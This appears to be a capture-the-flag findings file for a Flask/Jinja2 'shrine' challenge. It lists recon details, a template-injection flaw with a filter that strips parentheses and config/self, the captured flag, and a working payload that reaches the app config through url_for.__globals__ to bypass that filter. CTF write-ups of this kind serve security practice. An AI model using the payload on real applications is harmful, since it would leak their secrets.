# Findings -- dasctf-shrine-ssti

## Target
https://65bde0e59a06b163d9baf709.http-ctf2.dasctf.com/

## Recon Results
- Server: openresty
- Framework: Flask (Python 2.7.16) + Werkzeug 0.15.5
- Endpoints: `/` (source), `/shrine/<path:shrine>` (SSTI endpoint)
- Flag location: `app.config['FLAG']` (loaded from env var, then popped)

## Vulnerability
- Type: Server-Side Template Injection (SSTI) in Jinja2
- Filter: parentheses removed, `config`/`self` nullified

## Exploit Payload
```
{{url_for.__globals__['current_app'].config['FLAG']}}
```

## Flag
CTF2{52c7715a-13c3-4a6f-be1b-420f72e8bc81}

## Files
- recon/index-source.html - Source code
- recon/headers.txt - HTTP headers
- recon/environ-keys.txt - Environment and globals enumeration
- recon/ssti-tests.txt - All SSTI test results
- flags/flag.txt - Captured flag
- attack-report.md - Full attack report
